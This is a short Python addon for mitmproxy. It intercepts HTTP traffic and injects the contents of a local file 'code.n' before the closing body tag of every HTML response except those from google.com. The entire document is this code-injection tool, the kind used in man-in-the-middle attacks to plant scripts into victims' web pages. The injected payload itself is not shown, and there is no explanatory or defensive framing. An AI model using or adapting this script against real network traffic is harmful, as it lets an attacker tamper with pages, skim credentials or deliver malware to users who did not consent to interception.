from mitmproxy import http
def response(flow: http.HTTPFlow) -> None:
       if "google.com" in flow.request.url:
           return
       if "text/html" in flow.response.headers.get("Content-Type", ""):
           with open ("code.n", "r") as file:
            code = file.read()
           flow.response.text = flow.response.text.replace("</body>", code + "</body>")
